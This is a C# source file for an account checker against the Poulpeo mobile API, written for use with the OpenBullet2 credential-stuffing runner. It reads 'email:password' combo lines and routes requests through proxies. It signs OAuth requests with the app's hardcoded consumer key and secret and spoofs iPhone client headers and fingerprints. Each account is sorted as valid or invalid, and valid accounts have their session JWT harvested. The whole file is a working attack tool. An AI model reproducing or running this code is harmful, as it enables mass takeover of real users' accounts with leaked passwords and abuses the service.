using System.Collections.Specialized;
using System.Globalization;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;

namespace PoulpeoMobile;

/// <summary>
/// Flux mobile Poulpeo (OAuth 1.0a) : requestToken → login → accessToken → getToken (JWT).
/// Équivalent au script Python tls_client ; les appels Braze / Firebase du HAR ne sont pas requis pour le JWT.
///
/// OpenBullet2 : le bloc « Script » embarqué ne propose pas C# (Jint / Node / IronPython).
/// Pour OB2, référencer cette bibliothèque dans un plugin .NET, ou recopier <see cref="BuildOAuthHeader"/>
/// et les URLs dans des blocs HTTP + variables (<c>input.USER</c>, <c>input.PASS</c>, proxy <c>data.Proxy</c>).
/// Chaque bot = un appel à <see cref="CheckAccountAsync"/> ; le parallélisme est géré par le runner OB2.
/// </summary>
public static class PoulpeoMobileFlow
{
    public const string InvalidMessage = "Email, pseudo ou mot de passe invalide";

    public const string RequestTokenUrl = "https://mobile.poulpeo.com/api/2.2/oauth/requestToken/";
    public const string LoginUrl = "https://mobile.poulpeo.com/api/2.2/user/login/";
    public const string AccessTokenUrl = "https://mobile.poulpeo.com/api/2.2/oauth/accessToken/";
    public const string GetTokenUrl = "https://mobile.poulpeo.com/api/2.2/user/getToken/";

    private static readonly Regex StatusOkRegex = new(@"""status""\s*:\s*""ok""", RegexOptions.Compiled);

    private static readonly JsonSerializerOptions CompactJson = new()
    {
        WriteIndented = false,
        DefaultIgnoreCondition = JsonIgnoreCondition.Never,
    };

    /// <summary>Consumer key / secret (même build que l’app mobile).</summary>
    public sealed class OAuthCredentials
    {
        public string ConsumerKey { get; init; } = "als57b6d9b235e084.77233595";
        public string ConsumerSecret { get; init; } = "84dbb79eddc1effe14965db52caeae70636ac31b";
    }

    public enum AccountOutcome
    {
        Valid,
        Invalid,
        Error,
    }

    public sealed class CheckResult
    {
        public AccountOutcome Outcome { get; init; }
        public string? Jwt { get; init; }
        public string? GetTokenRawBody { get; init; }
        public int? GetTokenHttpStatus { get; init; }
    }

    /// <summary>Analyse une ligne combo « email:password ».</summary>
    public static bool TryParseCombo(string line, out string email, out string password)
    {
        email = "";
        password = "";
        line = line.Trim();
        if (string.IsNullOrEmpty(line) || line.StartsWith('#', StringComparison.Ordinal))
            return false;
        var idx = line.IndexOf(':');
        if (idx <= 0)
            return false;
        email = line[..idx].Trim();
        password = line[(idx + 1)..].Trim();
        return email.Length > 0 && password.Length > 0;
    }

    /// <summary>Proxy HTTP(S) type « http://user:pass@host:port » ou null.</summary>
    public static Uri? ParseProxy(string? raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            return null;
        raw = raw.Trim().Trim('"').Trim('\'');
        if (raw.Length == 0)
            return null;
        if (!Uri.TryCreate(raw, UriKind.Absolute, out var uri))
            throw new FormatException("Proxy invalide : URI absolue attendue.");
        if (uri.Scheme is not ("http" or "https") || string.IsNullOrEmpty(uri.Host))
            throw new FormatException("Proxy invalide : schéma http(s) et hôte requis.");
        return uri;
    }

    /// <summary>Exécute le flux complet pour un couple email / mot de passe.</summary>
    public static async Task<CheckResult> CheckAccountAsync(
        string email,
        string password,
        OAuthCredentials creds,
        Uri? proxyUri,
        CancellationToken cancellationToken = default)
    {
        using var handler = CreateHandler(proxyUri);
        using var http = new HttpClient(handler)
        {
            Timeout = TimeSpan.FromSeconds(120),
        };

        var requestPair = await FetchRequestTokenAsync(http, creds, cancellationToken).ConfigureAwait(false);
        if (requestPair is null)
            return new CheckResult { Outcome = AccountOutcome.Error };

        var (oauthToken, oauthTokenSecret) = requestPair.Value;
        using var loginResponse = await PostLoginAsync(http, creds, oauthToken, oauthTokenSecret, email, password, cancellationToken)
            .ConfigureAwait(false);
        var loginText = await loginResponse.Content.ReadAsStringAsync(cancellationToken).ConfigureAwait(false);
        var kind = ClassifyLoginResponseText(loginText);
        if (kind != AccountOutcome.Valid)
            return new CheckResult { Outcome = kind };

        var accessPair = await FetchAccessTokenAsync(http, creds, oauthToken, oauthTokenSecret, cancellationToken)
            .ConfigureAwait(false);
        if (accessPair is null)
            return new CheckResult { Outcome = AccountOutcome.Error };

        var (accessToken, accessSecret) = accessPair.Value;
        var jwtResult = await FetchUserJwtAsync(http, creds, accessToken, accessSecret, cancellationToken)
            .ConfigureAwait(false);
        if (jwtResult is null)
            return new CheckResult { Outcome = AccountOutcome.Error };

        return new CheckResult
        {
            Outcome = AccountOutcome.Valid,
            Jwt = jwtResult.Value.Jwt,
            GetTokenRawBody = jwtResult.Value.RawBody,
            GetTokenHttpStatus = jwtResult.Value.HttpStatus,
        };
    }

    private static HttpClientHandler CreateHandler(Uri? proxyUri)
    {
        var h = new HttpClientHandler
        {
            AutomaticDecompression = DecompressionMethods.All,
        };
        if (proxyUri is not null)
        {
            h.Proxy = new WebProxy(proxyUri);
            h.UseProxy = true;
        }
        return h;
    }

    private static async Task<(string oauthToken, string oauthTokenSecret)?> FetchRequestTokenAsync(
        HttpClient http,
        OAuthCredentials creds,
        CancellationToken ct)
    {
        var body = new Dictionary<string, string> { ["realm"] = RequestTokenUrl };
        var auth = BuildOAuthHeader("POST", RequestTokenUrl, creds.ConsumerKey, creds.ConsumerSecret,
            token: null, tokenSecret: "", body);

        using var req = new HttpRequestMessage(HttpMethod.Post, RequestTokenUrl);
        foreach (var kv in CommonHeadersPost())
            req.Headers.TryAddWithoutValidation(kv.Key, kv.Value);
        req.Headers.TryAddWithoutValidation("Authorization", auth);
        req.Content = new FormUrlEncodedContent(body);

        using var response = await http.SendAsync(req, ct).ConfigureAwait(false);
        if (response.StatusCode != HttpStatusCode.OK)
            return null;

        var text = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
        return ParseOAuthTokenQuery(text);
    }

    private static async Task<HttpResponseMessage> PostLoginAsync(
        HttpClient http,
        OAuthCredentials creds,
        string oauthToken,
        string oauthTokenSecret,
        string email,
        string password,
        CancellationToken ct)
    {
        var opendata = new OpenData
        {
            ClientId = "als52f20495d05ac2.56394549",
            Application = new OpenDataApp
            {
                AdvertiserId = Guid.NewGuid().ToString("D").ToUpperInvariant(),
                Version = "26.1.5",
            },
            Version = "2.0",
            Fp = Guid.NewGuid().ToString("D").ToUpperInvariant(),
            Viewport = "smartphone",
        };
        var opendataJson = JsonSerializer.Serialize(opendata, CompactJson);

        var loginBody = new Dictionary<string, string>
        {
            ["email"] = email,
            ["password"] = password,
            ["realm"] = LoginUrl,
            ["opendata"] = opendataJson,
        };

        var auth = BuildOAuthHeader("POST", LoginUrl, creds.ConsumerKey, creds.ConsumerSecret,
            oauthToken, oauthTokenSecret, loginBody);

        using var req = new HttpRequestMessage(HttpMethod.Post, LoginUrl);
        foreach (var kv in CommonHeadersPost())
            req.Headers.TryAddWithoutValidation(kv.Key, kv.Value);
        req.Headers.TryAddWithoutValidation("Authorization", auth);
        req.Content = new FormUrlEncodedContent(loginBody);

        return await http.SendAsync(req, ct).ConfigureAwait(false);
    }

    private static async Task<(string oauthToken, string oauthTokenSecret)?> FetchAccessTokenAsync(
        HttpClient http,
        OAuthCredentials creds,
        string oauthToken,
        string oauthTokenSecret,
        CancellationToken ct)
    {
        var body = new Dictionary<string, string> { ["realm"] = AccessTokenUrl };
        var auth = BuildOAuthHeader("POST", AccessTokenUrl, creds.ConsumerKey, creds.ConsumerSecret,
            oauthToken, oauthTokenSecret, body);

        using var req = new HttpRequestMessage(HttpMethod.Post, AccessTokenUrl);
        foreach (var kv in CommonHeadersPost())
            req.Headers.TryAddWithoutValidation(kv.Key, kv.Value);
        req.Headers.TryAddWithoutValidation("Authorization", auth);
        req.Content = new FormUrlEncodedContent(body);

        using var response = await http.SendAsync(req, ct).ConfigureAwait(false);
        if (response.StatusCode != HttpStatusCode.OK)
            return null;

        var text = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
        return ParseOAuthTokenQuery(text);
    }

    private static async Task<(string Jwt, string RawBody, int HttpStatus)?> FetchUserJwtAsync(
        HttpClient http,
        OAuthCredentials creds,
        string accessToken,
        string accessTokenSecret,
        CancellationToken ct)
    {
        var auth = BuildOAuthHeader("GET", GetTokenUrl, creds.ConsumerKey, creds.ConsumerSecret,
            accessToken, accessTokenSecret, extraParams: null);

        using var req = new HttpRequestMessage(HttpMethod.Get, GetTokenUrl);
        req.Headers.TryAddWithoutValidation("accept", "application/json");
        req.Headers.TryAddWithoutValidation("x-client-version", "26.1.5");
        req.Headers.TryAddWithoutValidation("accept-charset", "UTF-8");
        req.Headers.TryAddWithoutValidation("accept-encoding", "deflate;q=1.0,gzip;q=0.9");
        req.Headers.TryAddWithoutValidation("accept-language", "fr-FR,fr;q=0.9");
        req.Headers.TryAddWithoutValidation("user-agent", CommonUserAgent);
        req.Headers.TryAddWithoutValidation("priority", "u=3, i");
        req.Headers.TryAddWithoutValidation("Authorization", auth);

        using var response = await http.SendAsync(req, ct).ConfigureAwait(false);
        var raw = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
        var code = (int)response.StatusCode;
        if (response.StatusCode != HttpStatusCode.OK)
            return null;

        try
        {
            using var doc = JsonDocument.Parse(raw);
            var root = doc.RootElement;
            if (root.ValueKind == JsonValueKind.Object &&
                root.TryGetProperty("status", out var st) &&
                st.GetString() == "ok" &&
                root.TryGetProperty("data", out var data) &&
                data.ValueKind == JsonValueKind.String)
            {
                var jwt = data.GetString();
                if (!string.IsNullOrEmpty(jwt))
                    return (jwt, raw, code);
            }
        }
        catch (JsonException)
        {
            return null;
        }

        return null;
    }

    private static (string oauthToken, string oauthTokenSecret)? ParseOAuthTokenQuery(string text)
    {
        var pairs = ParseFormUrlEncoded(text);
        if (!pairs.TryGetValue("oauth_token", out var tok) ||
            !pairs.TryGetValue("oauth_token_secret", out var sec) ||
            string.IsNullOrEmpty(tok) || string.IsNullOrEmpty(sec))
            return null;
        return (tok, sec);
    }

    /// <summary>Décodage type application/x-www-form-urlencoded (clés / valeurs).</summary>
    public static Dictionary<string, string> ParseFormUrlEncoded(string text)
    {
        var d = new Dictionary<string, string>(StringComparer.Ordinal);
        if (string.IsNullOrEmpty(text))
            return d;
        foreach (var part in text.Split('&', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
        {
            var eq = part.IndexOf('=');
            if (eq < 0)
                continue;
            var key = Uri.UnescapeDataString(part[..eq].Replace('+', ' '));
            var val = Uri.UnescapeDataString(part[(eq + 1)..].Replace('+', ' '));
            d[key] = val;
        }
        return d;
    }

    public static AccountOutcome ClassifyLoginResponseText(string text)
    {
        if (text.Contains(InvalidMessage, StringComparison.Ordinal))
            return AccountOutcome.Invalid;

        try
        {
            using var doc = JsonDocument.Parse(text);
            if (doc.RootElement.ValueKind == JsonValueKind.Object &&
                doc.RootElement.TryGetProperty("status", out var st) &&
                st.GetString() == "ok")
                return AccountOutcome.Valid;
        }
        catch (JsonException)
        {
            // fall through
        }

        if (StatusOkRegex.IsMatch(text))
            return AccountOutcome.Valid;

        return AccountOutcome.Error;
    }

    private const string CommonUserAgent =
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148";

    private static IEnumerable<KeyValuePair<string, string>> CommonHeadersPost()
    {
        yield return new("Accept", "application/json");
        yield return new("Accept-Charset", "UTF-8");
        yield return new("Accept-Encoding", "gzip, deflate, br");
        yield return new("Accept-Language", "fr-FR,fr;q=0.9");
        yield return new("Connection", "keep-alive");
        yield return new("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        yield return new("User-Agent", CommonUserAgent);
        yield return new("X-CLIENT-VERSION", "26.1.5");
        yield return new("Origin", "https://mobile.poulpeo.com");
        yield return new("Referer", "https://mobile.poulpeo.com/");
    }

    /// <summary>Équivalent à urllib.parse.quote(s, safe="") pour OAuth 1.0 (hors caractères non réservés).</summary>
    public static string PercentEncodeOAuth(string s)
    {
        var bytes = Encoding.UTF8.GetBytes(s);
        var sb = new StringBuilder(bytes.Length * 3);
        foreach (var b in bytes)
        {
            var c = (char)b;
            if (IsUnreserved(c))
                sb.Append(c);
            else
                sb.Append('%').Append(b.ToString("X2", CultureInfo.InvariantCulture));
        }
        return sb.ToString();
    }

    private static bool IsUnreserved(char c) =>
        (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
        c is '-' or '_' or '.' or '~';

    public static string BuildOAuthHeader(
        string method,
        string url,
        string consumerKey,
        string consumerSecret,
        string? token,
        string tokenSecret,
        IReadOnlyDictionary<string, string>? extraParams)
    {
        var oauthParams = new OrderedDictionary(StringComparer.Ordinal)
        {
            ["oauth_consumer_key"] = consumerKey,
            ["oauth_nonce"] = Guid.NewGuid().ToString("N"),
            ["oauth_signature_method"] = "HMAC-SHA1",
            ["oauth_timestamp"] = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString(CultureInfo.InvariantCulture),
            ["oauth_version"] = "1.0",
        };
        if (!string.IsNullOrEmpty(token))
            oauthParams["oauth_token"] = token!;

        var signatureParams = new Dictionary<string, string>(StringComparer.Ordinal);
        foreach (DictionaryEntry de in oauthParams)
            signatureParams[(string)de.Key!] = (string)de.Value!;

        if (extraParams is not null)
        {
            foreach (var kv in extraParams)
                signatureParams[kv.Key] = kv.Value;
        }

        var encodedPairs = signatureParams
            .Select(kv => (Key: PercentEncodeOAuth(kv.Key), Val: PercentEncodeOAuth(kv.Value)))
            .OrderBy(t => t.Key, StringComparer.Ordinal)
            .ThenBy(t => t.Val, StringComparer.Ordinal)
            .ToList();

        var paramString = string.Join("&", encodedPairs.Select(p => $"{p.Key}={p.Val}"));
        var baseString = string.Join("&", new[]
        {
            method.ToUpperInvariant(),
            PercentEncodeOAuth(url),
            PercentEncodeOAuth(paramString),
        });

        var signingKey = PercentEncodeOAuth(consumerSecret) + "&" + PercentEncodeOAuth(tokenSecret);
        using var hmac = new HMACSHA1(Encoding.UTF8.GetBytes(signingKey));
        var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(baseString));
        var signature = Convert.ToBase64String(hash);

        oauthParams["oauth_signature"] = signature;

        var parts = new List<string>(oauthParams.Count);
        foreach (DictionaryEntry de in oauthParams)
        {
            var k = (string)de.Key!;
            var v = (string)de.Value!;
            parts.Add($"{k}=\"{PercentEncodeOAuth(v)}\"");
        }

        return "OAuth " + string.Join(", ", parts);
    }

    private sealed class OpenData
    {
        [JsonPropertyName("client_id")]
        public string ClientId { get; set; } = "";

        [JsonPropertyName("application")]
        public OpenDataApp Application { get; set; } = new();

        [JsonPropertyName("version")]
        public string Version { get; set; } = "";

        [JsonPropertyName("fp")]
        public string Fp { get; set; } = "";

        [JsonPropertyName("viewport")]
        public string Viewport { get; set; } = "";
    }

    private sealed class OpenDataApp
    {
        [JsonPropertyName("advertiser_id")]
        public string AdvertiserId { get; set; } = "";

        [JsonPropertyName("version")]
        public string Version { get; set; } = "";
    }
}
